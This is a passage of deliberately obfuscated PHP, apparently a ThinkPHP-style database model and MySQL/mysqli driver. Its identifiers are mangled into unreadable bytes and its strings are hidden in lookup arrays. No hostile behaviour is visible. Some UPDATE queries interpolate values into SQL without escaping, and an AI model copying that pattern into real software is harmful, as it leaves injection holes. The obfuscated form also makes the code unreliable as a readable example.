array_unshift($Š¾¯¤Í—, $Õ¹Ø¢ò¼[$ÁÕ™ìÚ]); } if ($Àüõøßä[397] == $±¾ËÛõ¨[3]) { $Õ¹Ø¢ò¼[$ÁÕ™ìÚ] = call_user_func_array($éë¿õĞ, $Š¾¯¤Í—); } else { $Õ¹Ø¢ò¼[$ÁÕ™ìÚ] = call_user_func_array(array(&$this, $éë¿õĞ), $Š¾¯¤Í—); } break; case $Àüõøßä[347]: if (isset($Õ¹Ø¢ò¼[$ÁÕ™ìÚ]) && $Õ¹Ø¢ò¼[$ÁÕ™ìÚ]) { $Õ¹Ø¢ò¼[$ÁÕ™ìÚ] = call_user_func_array(array(&$this, $±¾ËÛõ¨[1]), array($Õ¹Ø¢ò¼[$ÁÕ™ìÚ])); } break; case $Àüõøßä[350]: $Õ¹Ø¢ò¼[$ÁÕ™ìÚ] = $Õ¹Ø¢ò¼[$±¾ËÛõ¨[1]]; break; case $Àüõøßä[370]: if (isset($Õ¹Ø¢ò¼[$ÁÕ™ìÚ]) && !is_string($Õ¹Ø¢ò¼[$ÁÕ™ìÚ])) { $Õ¹Ø¢ò¼[$ÁÕ™ìÚ] = json_encode_force($Õ¹Ø¢ò¼[$ÁÕ™ìÚ]); } break; case $Àüõøßä[399]: if ($Õ¹Ø¢ò¼[$ÁÕ™ìÚ] === $Àüõøßä[12]) { unset($Õ¹Ø¢ò¼[$ÁÕ™ìÚ]); } break; case $Àüõøßä[400]: $Õ¹Ø¢ò¼[$ÁÕ™ìÚ] = $±¾ËÛõ¨[1]; default: break; } } if ($Ÿ©ã¡¨† == $Àüõøßä[431]) { $Š‹šÂË = strtolower($this->db->getDbType()); if (strpos($Š‹šÂË, $Àüõøßä[13]) !== 0) { return; } $À±±¬ñÛ = $this->field(!0)->fields; $òåüÀÑ¤ = $À±±¬ñÛ[$Àüõøßä[329]]; if (isset($À±±¬ñÛ[$Àüõøßä[328]])) { unset($òåüÀÑ¤[$À±±¬ñÛ[$Àüõøßä[328]]]); } foreach ($òåüÀÑ¤ as $íËİÀ => $Ÿ©ã¡¨†) { if (!isset($Õ¹Ø¢ò¼[$íËİÀ])) { $Õ¹Ø¢ò¼[$íËİÀ] = $Àüõøßä[12]; } } } } private function dataAfterFilter(&$¬˜×Šù­) { $ä“ùÌˆ³ =& $_SERVER[ìïæ“œî]; foreach ($this->dataAuto as $ÖœìŸ–ß) { $×ßÙƒ½ = $ÖœìŸ–ß[0]; if (!isset($¬˜×Šù­[$×ßÙƒ½])) { continue; } if (!in_array($ä“ùÌˆ³[433], explode($ä“ùÌˆ³[50], $ÖœìŸ–ß[2]))) { continue; } switch (trim($ÖœìŸ–ß[3])) { case $ä“ùÌˆ³[397]: case $ä“ùÌˆ³[398]: $¦Ï©ß‹— = isset($ÖœìŸ–ß[4]) ? (array) $ÖœìŸ–ß[4] : array(); array_unshift($¦Ï©ß‹—, $¬˜×Šù­[$×ßÙƒ½]); if (isset($ÖœìŸ–ß[4]) && $ÖœìŸ–ß[4] == $ä“ùÌˆ³[453]) { $¦Ï©ß‹— = array($¬˜×Šù­[$×ßÙƒ½]); } if ($ä“ùÌˆ³[397] == $ÖœìŸ–ß[3]) { $¬˜×Šù­[$×ßÙƒ½] = call_user_func_array($ÖœìŸ–ß[1], $¦Ï©ß‹—); } else { $¬˜×Šù­[$×ßÙƒ½] = call_user_func_array(array(&$this, $ÖœìŸ–ß[1]), $¦Ï©ß‹—); } break; case $ä“ùÌˆ³[347]: if (isset($¬˜×Šù­[$×ßÙƒ½]) && $¬˜×Šù­[$×ßÙƒ½]) { $¬˜×Šù­[$×ßÙƒ½] = call_user_func_array(array(&$this, $ÖœìŸ–ß[1]), array($¬˜×Šù­[$×ßÙƒ½])); } break; case $ä“ùÌˆ³[350]: $¬˜×Šù­[$×ßÙƒ½] = $¬˜×Šù­[$ÖœìŸ–ß[1]]; break; case $ä“ùÌˆ³[370]: $†¥–İ›â = $¬˜×Šù­[$×ßÙƒ½]; $¬˜×Šù­[$×ßÙƒ½] = json_decode($†¥–İ›â, !0); if (is_null($¬˜×Šù­[$×ßÙƒ½])) { $¬˜×Šù­[$×ßÙƒ½] = $†¥–İ›â; } break; case $ä“ùÌˆ³[399]: if ($¬˜×Šù­[$×ßÙƒ½] === $ä“ùÌˆ³[12]) { unset($¬˜×Šù­[$×ßÙƒ½]); } break; case $ä“ùÌˆ³[400]: $¬˜×Šù­[$×ßÙƒ½] = $ÖœìŸ–ß[1]; break; default: break; } } } public function saveAll($™ïğ›Á) { $ÙÇ¦–”‡ =& $_SERVER[ìïæ“œî]; $êæíé¢Ú = $this->tablePrefix . $this->tableName; $—‘…ò‚ = self::SQL_WHERE_IN_CHUNK; $™ïğ›Á = is_array($™ïğ›Á) ? $™ïğ›Á : array(); $·¦”¸Åœ = $ÙÇ¦–”‡[454]; $³¯¸ÌÌ† = 0; $ª‚‚—˜À = array(); $ƒ’ÏÄÕ½ = count($™ïğ›Á); for ($®Õó™ = 0; $®Õó™ < $ƒ’ÏÄÕ½; $®Õó™++) { $›ÙÊşÔò = $™ïğ›Á[$®Õó™]; if (!is_array($›ÙÊşÔò) || count($›ÙÊşÔò) != 4) { continue; } $Ï–‹’ = "\125\120\104\x41\124\105\x20\x60{$êæíé¢Ú}\x60\40\123\105\x54\40{$›ÙÊşÔò[2]}\40\x3d\40\103\x41\x53\105\40{$›ÙÊşÔò[0]}\x20\xa"; if ($³¯¸ÌÌ† == 0) { $·¦”¸Åœ = $Ï–‹’; } $ª‚‚—˜À[] = $ÙÇ¦–”‡[121] . $›ÙÊşÔò[1] . $ÙÇ¦–”‡[121]; $³¯¸ÌÌ†++; $·¦”¸Åœ .= "\40\127\x48\x45\116\40\x27{$›ÙÊşÔò[1]}\x27\x20\x54\x48\105\116\40\x27{$›ÙÊşÔò[3]}\x27\40\xa"; if ($³¯¸ÌÌ† == $—‘…ò‚ || $®Õó™ == $ƒ’ÏÄÕ½ - 1) { $ ¡äº©° = implode($ÙÇ¦–”‡[50], $ª‚‚—˜À); $·¦”¸Åœ .= "\40\x45\116\104\x20\x20\127\110\x45\122\x45\x20{$›ÙÊşÔò[0]}\40\x49\116\40\50{$ ¡äº©°}\x29\40"; $this->execute($·¦”¸Åœ); $³¯¸ÌÌ† = 0; $·¦”¸Åœ = $Ï–‹’; $this->chunkEventCheck(count($ª‚‚—˜À)); $ª‚‚—˜À = array(); } } $this->chunkEventSet(); } public function saveAllEach($èèŠˆ¬Ÿ) { $Å¸œí‹¯ =& $_SERVER[ìïæ“œî]; $Š¦’ûŠØ = $this->tablePrefix . $this->tableName; foreach ($èèŠˆ¬Ÿ as $¸ÖŸ—æÆ) { if (!is_array($¸ÖŸ—æÆ) || count($¸ÖŸ—æÆ) != 4) { continue; } $ËªÓ˜ÀÂ = $¸ÖŸ—æÆ[0] . $Å¸œí‹¯[455] . $¸ÖŸ—æÆ[1] . $Å¸œí‹¯[121]; $ï¸º¶û¬ = $¸ÖŸ—æÆ[2] . $Å¸œí‹¯[455] . $¸ÖŸ—æÆ[3] . $Å¸œí‹¯[121]; $şĞ‡ˆâ› = "\x75\160\144\141\x74\145\40{$Š¦’ûŠØ}\x20\x73\145\x74\40{$ï¸º¶û¬}\x20\167\x68\x65\162\145\40{$ËªÓ˜ÀÂ}\x3b"; $this->execute($şĞ‡ˆâ›); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Îûô’Àº = false, $’’¸”ªü = false) { $this->_chunkEvent = $Îûô’Àº; $this->_chunkEventParam = $’’¸”ªü; } private function chunkEventCheck($ş³€”œø) { if (!$this->_chunkEvent) { return; } $Óß×êç = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Óß×êç[$_SERVER[ìïæ“œî][456]] = $ş³€”œø; Hook::trigger($this->_chunkEvent, $Óß×êç); } public function addAll($¬ƒ¥Ì…û, $Ãæ¡öƒ¤ = array(), $ËØş‘« = false) { $¯¢’‰‘ë =& $_SERVER[ìïæ“œî]; ignore_timeout(); $ç¥™ù™¨ = self::SQL_WHERE_IN_CHUNK; if (empty($¬ƒ¥Ì…û)) { $this->error = think_lang($¯¢’‰‘ë[348]); return !1; } $Ãæ¡öƒ¤ = $this->_parseOptions($Ãæ¡öƒ¤); foreach ($¬ƒ¥Ì…û as $ÙŒö›€ => $ÔÚüù¿ñ) { $¬ƒ¥Ì…û[$ÙŒö›€] = $this->_facade($ÔÚüù¿ñ); $this->_beforeInsert($¬ƒ¥Ì…û[$ÙŒö›€], $Ãæ¡öƒ¤); } if (method_exists($this->db, $¯¢’‰‘ë[349])) { for ($ğ«áˆış = 0; $ğ«áˆış < count($¬ƒ¥Ì…û); $ğ«áˆış += $ç¥™ù™¨) { $Ä¤Í´î = array_slice($¬ƒ¥Ì…û, $ğ«áˆış, $ç¥™ù™¨); if (!is_array($Ä¤Í´î) || count($Ä¤Í´î) == 0) { break; } $à´«ç‚á = $this->db->insertAll($Ä¤Í´î, $Ãæ¡öƒ¤, $ËØş‘«); $this->chunkEventCheck(count($Ä¤Í´î)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¬ƒ¥Ì…û as $ÙŒö›€ => $ÔÚüù¿ñ) { $à´«ç‚á = $this->db->insert($ÔÚüù¿ñ, $Ãæ¡öƒ¤, $ËØş‘«); } $this->commit(); } if (!1 !== $à´«ç‚á) { $£Ã¬¢šï = $this->getLastInsID(); if ($£Ã¬¢šï) { return $£Ã¬¢šï; } } return $à´«ç‚á; } public function save($ÔĞ¿— = '', $û˜Æ’õá = array()) { $¢ÛÃúˆ¦ =& $_SERVER[ìïæ“œî]; $ìì¢åµ = self::SQL_WHERE_IN_CHUNK; $™ƒÜßòè = $this->optionsValue(); $ôÀìãĞÂ = $this->findWhereField($™ƒÜßòè); if (!$ôÀìãĞÂ) { return parent::save($ÔĞ¿—, $û˜Æ’õá); } $ïºõØüØ = 0; $®¬ÍÑÔİ = $™ƒÜßòè[$¢ÛÃúˆ¦[352]][$ôÀìãĞÂ][1]; $®¬ÍÑÔİ = is_array($®¬ÍÑÔİ) ? $®¬ÍÑÔİ : array(); $€Öä„ª‘ = count($®¬ÍÑÔİ); for ($ş¼ôÑÏ‡ = 0; $ş¼ôÑÏ‡ < $€Öä„ª‘; $ş¼ôÑÏ‡ += $ìì¢åµ) { $’±äµ«ñ = array_slice($®¬ÍÑÔİ, $ş¼ôÑÏ‡, $ìì¢åµ); if (!is_array($’±äµ«ñ) || count($’±äµ«ñ) == 0) { break; } $™ƒÜßòè[$¢ÛÃúˆ¦[352]][$ôÀìãĞÂ][1] = $’±äµ«ñ; $this->optionsValue($™ƒÜßòè); $ïºõØüØ += parent::save($ÔĞ¿—, $û˜Æ’õá); $this->chunkEventCheck(count($’±äµ«ñ)); } $this->chunkEventSet(); return $ïºõØüØ; } public function add($Îı€ø€„ = '', $²­ï‰º = array(), $Âç…Ï™ = false) { if ($this->addTaskStatus && is_array($Îı€ø€„)) { $this->addTaskData[] = $Îı€ø€„; return; } return parent::add($Îı€ø€„, $²­ï‰º, $Âç…Ï™); } public function parseWhereLike($Ùú¡ÈØµ, $§êÀ = '', $èƒ°·¨Ö = false, &$ÙÓ…³İ = false) { $šôË½ïÔ =& $_SERVER[ìïæ“œî]; $åÃÍ’˜ï = $GLOBALS[$šôË½ïÔ[6]][$šôË½ïÔ[457]]; if (!$åÃÍ’˜ï[$šôË½ïÔ[458]]) { return $Ùú¡ÈØµ; } if (!is_array($Ùú¡ÈØµ)) { return $Ùú¡ÈØµ; } $ÀÏ¢–Å = array(); $äÛ“àä¯ = 0; foreach ($Ùú¡ÈØµ as $Ï©îûÏ… => $€Í‡‚ú) { if (is_array($€Í‡‚ú) && count($€Í‡‚ú) == 2 && $€Í‡‚ú[0] == $šôË½ïÔ[459] && is_string($€Í‡‚ú[1]) && substr($€Í‡‚ú[1], 0, 1) == $šôË½ïÔ[460] && substr($€Í‡‚ú[1], strlen($€Í‡‚ú[1]) - 1, 1) == $šôË½ïÔ[460]) { $ÙÓ…³İ = !0; $êÂˆ”ô = is_string($Ï©îûÏ…) ? $Ï©îûÏ… : $§êÀ; $¼¡¤Òó = substr($€Í‡‚ú[1], 1, strlen($€Í‡‚ú[1]) - 2); $¼¡¤Òó = $this->db->escapeString($¼¡¤Òó); if (!strpos($êÂˆ”ô, $šôË½ïÔ[10])) { $êÂˆ”ô = $šôË½ïÔ[461] . $êÂˆ”ô . $šôË½ïÔ[461]; } $¨›İ…Æ = $šôË½ïÔ[220] . $¼¡¤Òó . $šôË½ïÔ[220]; $¼¡¤Òó = str_replace(array($šôË½ïÔ[10], $šôË½ïÔ[462], $šôË½ïÔ[11]), $šôË½ïÔ[463], $¼¡¤Òó); if ($åÃÍ’˜ï[$šôË½ïÔ[464]]) { $¨›İ…Æ = $šôË½ïÔ[465] . $¼¡¤Òó . $šôË½ïÔ[466]; if ($åÃÍ’˜ï[$šôË½ïÔ[467]]) { $¨›İ…Æ = $šôË½ïÔ[466] . $¼¡¤Òó . $šôË½ïÔ[465]; } } $ÀÏ¢–Å[$äÛ“àä¯] = $šôË½ïÔ[468] . $êÂˆ”ô . $šôË½ïÔ[469] . $¨›İ…Æ . $šôË½ïÔ[470]; $äÛ“àä¯++; continue; } if (is_array($€Í‡‚ú)) { $§êÀ = is_string($Ï©îûÏ…) ? $Ï©îûÏ… : $§êÀ; $€Í‡‚ú = $this->parseWhereLike($€Í‡‚ú, $§êÀ, !0, $ÙÓ…³İ); } if (is_numeric($Ï©îûÏ…)) { $ÀÏ¢–Å[$äÛ“àä¯] = $€Í‡‚ú; $äÛ“àä¯++; } else { $ÀÏ¢–Å[$Ï©îûÏ…] = $€Í‡‚ú; } } if ($ÙÓ…³İ && !$èƒ°·¨Ö) { } return $ÀÏ¢–Å; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($’ğ•×ô = array()) { $€Óœ¬» =& $_SERVER[ìïæ“œî]; $ƒæ¼İÑ = self::SQL_WHERE_IN_CHUNK; $Üå¼²–¡ = $this->optionsValue(); $ËíŸÎÁœ = $this->findWhereField($Üå¼²–¡); if (!$ËíŸÎÁœ || isset($Üå¼²–¡[$€Óœ¬»[368]]) || isset($Üå¼²–¡[$€Óœ¬»[429]])) { return parent::select($’ğ•×ô); } $íÌêÖ³ş = $Üå¼²–¡[$€Óœ¬»[352]][$ËíŸÎÁœ][1]; $íÌêÖ³ş = is_array($íÌêÖ³ş) ? $íÌêÖ³ş : array(); $êˆ¿ıÄ¯ = null; for ($œÏ—ğÓÂ = 0; $œÏ—ğÓÂ < count($íÌêÖ³ş); $œÏ—ğÓÂ += $ƒæ¼İÑ) { $¯Ù½øø  = array_slice($íÌêÖ³ş, $œÏ—ğÓÂ, $ƒæ¼İÑ); if (!is_array($¯Ù½øø ) || count($¯Ù½øø ) == 0) { break; } $Üå¼²–¡[$€Óœ¬»[352]][$ËíŸÎÁœ][1] = $¯Ù½øø ; $this->optionsValue($Üå¼²–¡); $ÉÑÈ¢ = parent::select($’ğ•×ô); if (!$ÉÑÈ¢) { continue; } $êˆ¿ıÄ¯ = is_array($êˆ¿ıÄ¯) ? $êˆ¿ıÄ¯ : array(); $êˆ¿ıÄ¯ = array_merge($êˆ¿ıÄ¯, $ÉÑÈ¢); } return $êˆ¿ıÄ¯; } public function delete($¹şÔğéø = array()) { $öËˆ¥‚ =& $_SERVER[ìïæ“œî]; $ÇİÈ›®× = self::SQL_WHERE_IN_CHUNK; $¡«•·óí = $this->optionsValue(); $áÃ¢»§ = $this->findWhereField($¡«•·óí); if (!$áÃ¢»§) { return parent::delete($¹şÔğéø); } $‚êß¹èå = 0; $ó´îÍ·€ = $¡«•·óí[$öËˆ¥‚[352]][$áÃ¢»§][1]; $ó´îÍ·€ = is_array($ó´îÍ·€) ? $ó´îÍ·€ : array(); for ($Î·¶¹Á¼ = 0; $Î·¶¹Á¼ < count($ó´îÍ·€); $Î·¶¹Á¼ += $ÇİÈ›®×) { $ğÈšË­ = array_slice($ó´îÍ·€, $Î·¶¹Á¼, $ÇİÈ›®×); if (!is_array($ğÈšË­) || count($ğÈšË­) == 0) { break; } $¡«•·óí[$öËˆ¥‚[352]][$áÃ¢»§][1] = $ğÈšË­; $this->optionsValue($¡«•·óí); $‚êß¹èå += parent::delete($¹şÔğéø); } return $‚êß¹èå; } private function findWhereField($ÈÉıØ½å) { $‹¸ñ Öˆ =& $_SERVER[ìïæ“œî]; $€­ƒÚÓ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÈÉıØ½å) || !is_array($ÈÉıØ½å[$‹¸ñ Öˆ[352]])) { return !1; } foreach ($ÈÉıØ½å[$‹¸ñ Öˆ[352]] as $öï’ÑÂÒ => $Áòßç€ƒ) { if (is_array($Áòßç€ƒ) && isset($Áòßç€ƒ[0]) && is_string($Áòßç€ƒ[0]) && strtolower($Áòßç€ƒ[0]) == $‹¸ñ Öˆ[7] && is_array($Áòßç€ƒ[1]) && count($Áòßç€ƒ[1]) > $€­ƒÚÓ) { ignore_timeout(); return $öï’ÑÂÒ; } } return !1; } public function setMasterDB($·Ö ğº’ = true) { think_config($_SERVER[ìïæ“œî][471], $·Ö ğº’); } } goto e„¿’‚ï; b£ Ûí’¿õ: class DbMysql extends Db { public function __construct($İ¹­œòé = '') { $ãïÚí©ï =& $_SERVER[ìïæ“œî]; if (!extension_loaded($ãïÚí©ï[853])) { think_exception(think_lang($ãïÚí©ï[14]) . $ãïÚí©ï[940]); } if (!empty($İ¹­œòé)) { $this->config = $İ¹­œòé; if (empty($this->config[$ãïÚí©ï[17]])) { $this->config[$ãïÚí©ï[17]] = $ãïÚí©ï[12]; } } } public function connect($©û¥„¸Æ = '', $Œ–…ú¥” = 0, $ÖÓÄ¡‹ = false) { $Éƒ¸‚ =& $_SERVER[ìïæ“œî]; if (!isset($this->linkID[$Œ–…ú¥”])) { if (empty($©û¥„¸Æ)) { $©û¥„¸Æ = $this->config; } $øÌÚ…óš = $©û¥„¸Æ[$Éƒ¸‚[941]] . ($©û¥„¸Æ[$Éƒ¸‚[942]] ? "\x3a{$©û¥„¸Æ[$Éƒ¸‚[942]]}" : $Éƒ¸‚[12]); $‚úÁ’ = !empty($©û¥„¸Æ[$Éƒ¸‚[17]][$Éƒ¸‚[18]]) ? $©û¥„¸Æ[$Éƒ¸‚[17]][$Éƒ¸‚[18]] : $this->pconnect; if ($‚úÁ’) { $this->linkID[$Œ–…ú¥”] = mysql_pconnect($øÌÚ…óš, $©û¥„¸Æ[$Éƒ¸‚[943]], $©û¥„¸Æ[$Éƒ¸‚[944]], 131072); } else { $this->linkID[$Œ–…ú¥”] = mysql_connect($øÌÚ…óš, $©û¥„¸Æ[$Éƒ¸‚[943]], $©û¥„¸Æ[$Éƒ¸‚[944]], !0, 131072); } if (!$this->linkID[$Œ–…ú¥”] || !empty($©û¥„¸Æ[$Éƒ¸‚[21]]) && !mysql_select_db($©û¥„¸Æ[$Éƒ¸‚[21]], $this->linkID[$Œ–…ú¥”])) { think_exception(mysql_error()); } $Ã·¶Âù = mysql_get_server_info($this->linkID[$Œ–…ú¥”]); mysql_query($Éƒ¸‚[945] . think_config($Éƒ¸‚[946]) . $Éƒ¸‚[58], $this->linkID[$Œ–…ú¥”]); if ($Ã·¶Âù > $Éƒ¸‚[947]) { mysql_query($Éƒ¸‚[948], $this->linkID[$Œ–…ú¥”]); } $this->connected = !0; if (1 != think_config($Éƒ¸‚[22])) { unset($this->config); } } return $this->linkID[$Œ–…ú¥”]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($’ÎãŸÍ”) { $Ë¢ç·¨› =& $_SERVER[ìïæ“œî]; if (0 === stripos($’ÎãŸÍ”, $Ë¢ç·¨›[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $’ÎãŸÍ”; if ($this->queryID) { $this->free(); } think_action_status($Ë¢ç·¨›[23], 1); think_status($Ë¢ç·¨›[24]); $this->queryID = mysql_query($’ÎãŸÍ”, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ë÷Öà²§) { $‹àÁªŞ =& $_SERVER[ìïæ“œî]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ë÷Öà²§; if ($this->queryID) { $this->free(); } think_action_status($‹àÁªŞ[25], 1); think_status($‹àÁªŞ[24]); $ÚæÎİ©» = mysql_query($ë÷Öà²§, $this->_linkID); $this->debug(); if (!1 === $ÚæÎİ©») { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ìïæ“œî][949], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $İ£ãøƒ = mysql_query($_SERVER[ìïæ“œî][950], $this->_linkID); $this->transTimes = 0; if (!$İ£ãøƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŒÊßÕÙ = mysql_query($_SERVER[ìïæ“œî][951], $this->_linkID); $this->transTimes = 0; if (!$ŒÊßÕÙ) { $this->error(); return !1; } } return !0; } private function getAll() { $¶²è¿ÍÈ = array(); if ($this->numRows > 0) { while ($ëİ„šãÄ = mysql_fetch_assoc($this->queryID)) { $¶²è¿ÍÈ[] = $ëİ„šãÄ; } mysql_data_seek($this->queryID, 0); } return $¶²è¿ÍÈ; } public function getFields($á›££áİ) { $Ù’ù£ñ =& $_SERVER[ìïæ“œî]; $ ²¡·í = $this->query($Ù’ù£ñ[952] . $this->parseKey($á›££áİ)); $ááÖ®Ô  = array(); if ($ ²¡·í) { foreach ($ ²¡·í as $û˜’í‰ì => $ÔöÌÕíá) { $ááÖ®Ô [$ÔöÌÕíá[$Ù’ù£ñ[31]]] = array($Ù’ù£ñ[32] => $ÔöÌÕíá[$Ù’ù£ñ[31]], $Ù’ù£ñ[33] => $ÔöÌÕíá[$Ù’ù£ñ[34]], $Ù’ù£ñ[35] => (bool) (strtoupper($ÔöÌÕíá[$Ù’ù£ñ[36]]) === $Ù’ù£ñ[953]), $Ù’ù£ñ[37] => $ÔöÌÕíá[$Ù’ù£ñ[38]], $Ù’ù£ñ[39] => strtolower($ÔöÌÕíá[$Ù’ù£ñ[40]]) == $Ù’ù£ñ[41], $Ù’ù£ñ[42] => strtolower($ÔöÌÕíá[$Ù’ù£ñ[43]]) == $Ù’ù£ñ[44]); } } return $ááÖ®Ô ; } public function getTables($“İÁËë­ = '') { $ÜíšæÆÈ =& $_SERVER[ìïæ“œî]; if (!empty($“İÁËë­)) { $§¦öÖ = $ÜíšæÆÈ[954] . $“İÁËë­ . $ÜíšæÆÈ[955]; } else { $§¦öÖ = $ÜíšæÆÈ[956]; } $²ÊµÒ—Ï = $this->query($§¦öÖ); $°Ò¯§Ó = array(); foreach ($²ÊµÒ—Ï as $–ˆ‚†¨ => $ı¹œ™™Ö) { $°Ò¯§Ó[$–ˆ‚†¨] = current($ı¹œ™™Ö); } return $°Ò¯§Ó; } public function replace($îêÚéƒ, $Š¥æãÒ§ = array()) { $œèğàú’ =& $_SERVER[ìïæ“œî]; foreach ($îêÚéƒ as $ªµ¯É¬ => $ÍÂâ²) { $İû´´† = $this->parseValue($ÍÂâ²); if (is_scalar($İû´´†)) { $şÆÃ¦¦[] = $İû´´†; $˜¡¬’şÒ[] = $this->parseKey($ªµ¯É¬); } } $áßÛçˆˆ = $œèğàú’[957] . $this->parseTable($Š¥æãÒ§[$œèğàú’[356]]) . $œèğàú’[958] . implode($œèğàú’[50], $˜¡¬’şÒ) . $œèğàú’[959] . implode($œèğàú’[50], $şÆÃ¦¦) . $œèğàú’[960]; return $this->execute($áßÛçˆˆ); } public function insertAll($ö¼Ô÷ëÈ, $Èˆ«ş” = array(), $¶ô×’ı = false) { $ÛÌõ‘“À =& $_SERVER[ìïæ“œî]; if (!is_array($ö¼Ô÷ëÈ[0])) { return !1; } $İ™íé£ñ = array_keys($ö¼Ô÷ëÈ[0]); $å¥öØäÜ = array(); foreach ($ö¼Ô÷ëÈ as $¾„¦Ì°Ü) { $›è›îÄÓ = array(); foreach ($¾„¦Ì°Ü as $æòÏä¬– => $°Êğß‡) { $°Êğß‡ = $this->parseValue($°Êğß‡); if (is_scalar($°Êğß‡)) { $›è›îÄÓ[] = $°Êğß‡; } } $å¥öØäÜ[] = $ÛÌõ‘“À[337] . implode($ÛÌõ‘“À[50], $›è›îÄÓ) . $ÛÌõ‘“À[960]; } array_walk($İ™íé£ñ, array($this, $ÛÌõ‘“À[961])); $®¹³ç±× = ($¶ô×’ı ? $ÛÌõ‘“À[962] : $ÛÌõ‘“À[963]) . $ÛÌõ‘“À[964] . $this->parseTable($Èˆ«ş”[$ÛÌõ‘“À[356]]) . $ÛÌõ‘“À[958] . implode($ÛÌõ‘“À[50], $İ™íé£ñ) . $ÛÌõ‘“À[965] . implode($ÛÌõ‘“À[50], $å¥öØäÜ); return $this->execute($®¹³ç±×); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $â“·“Óø =& $_SERVER[ìïæ“œî]; $this->error = mysql_errno() . $â“·“Óø[4] . mysql_error($this->_linkID); if ($â“·“Óø[12] != $this->queryStr) { $this->error .= LNG($â“·“Óø[48]) . $this->queryStr; } think_trace($this->error, $â“·“Óø[12], $â“·“Óø[49]); return $this->error; } public function escapeString($Êñš¨Äï) { if ($this->_linkID) { return mysql_real_escape_string($Êñš¨Äï, $this->_linkID); } else { return mysql_escape_string($Êñš¨Äï); } } public function parseKey(&$´„‡²¸Í, $Ÿé‹ = true) { $²’å·¯· =& $_SERVER[ìïæ“œî]; if ($Ÿé‹) { $´„‡²¸Í = $this->parseKeyCheck($´„‡²¸Í); } if ($´„‡²¸Í != $²’å·¯·[220] && !preg_match($²’å·¯·[966], $´„‡²¸Í)) { $´„‡²¸Í = $²’å·¯·[461] . trim($´„‡²¸Í, $²’å·¯·[461]) . $²’å·¯·[461]; } return $´„‡²¸Í; } } class DbMysqli extends Db { public function __construct($é€•ªÖ¸ = '') { $óÛİ­§ç =& $_SERVER[ìïæ“œî]; if (!extension_loaded($óÛİ­§ç[967])) { think_exception(think_lang($óÛİ­§ç[14]) . $óÛİ­§ç[968]); } if (!empty($é€•ªÖ¸)) { $this->config = $é€•ªÖ¸; if (empty($this->config[$óÛİ­§ç[17]])) { $this->config[$óÛİ­§ç[17]] = $óÛİ­§ç[12]; } } } public function connect($ˆÑÂÙ™Ş = '', $†…•»òŒ = 0) { $õè²ß¼ =& $_SERVER[ìïæ“œî]; if (!isset($this->linkID[$†…•»òŒ])) { if (empty($ˆÑÂÙ™Ş)) { $ˆÑÂÙ™Ş = $this->config; } $this->linkID[$†…•»òŒ] = new mysqli($ˆÑÂÙ™Ş[$õè²ß¼[941]], $ˆÑÂÙ™Ş[$õè²ß¼[943]], $ˆÑÂÙ™Ş[$õè²ß¼[944]], $ˆÑÂÙ™Ş[$õè²ß¼[21]], $ˆÑÂÙ™Ş[$õè²ß¼[942]] ? intval($ˆÑÂÙ™Ş[$õè²ß¼[942]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÕĞË–¸‡ = $this->linkID[$†…•»òŒ]->server_version; $this->linkID[$†…•»òŒ]->query($õè²ß¼[945] . think_config($õè²ß¼[946]) . $õè²ß¼[58]); if ($ÕĞË–¸‡ > $õè²ß¼[947]) { $this->linkID[$†…•»òŒ]->query($õè²ß¼[948]); } $this->connected = !0; if (1 != think_config($õè²ß¼[22])) { unset($this->config); } } return $this->linkID[$†…•»òŒ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($§¬ûŞì) { $‚¨Ø¢÷ =& $_SERVER[ìïæ“œî]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $§¬ûŞì; if ($this->queryID) { $this->free(); } think_action_status($‚¨Ø¢÷[23], 1); think_status($‚¨Ø¢÷[24]); $this->queryID = $this->_linkID->query($§¬ûŞì); if ($this->_linkID->more_results()) { while (($ìŞÕäš = $this->_linkID->next_result()) != NULL) { $ìŞÕäš->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($‚‚ Èõ) { $§Œ•½ƒ =& $_SERVER[ìïæ“œî]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚‚ Èõ; if ($this->queryID) { $this->free(); } think_action_status($§Œ•½ƒ[25], 1); think_status($§Œ•½ƒ[24]); $û™›ßÊ˜ = $this->_linkID->query($‚‚ Èõ); $this->debug(); if (!1 === $û™›ßÊ˜) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $š†§…Í = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$š†§…Í) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ÿñ°ı“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ÿñ°ı“) { $this->error(); 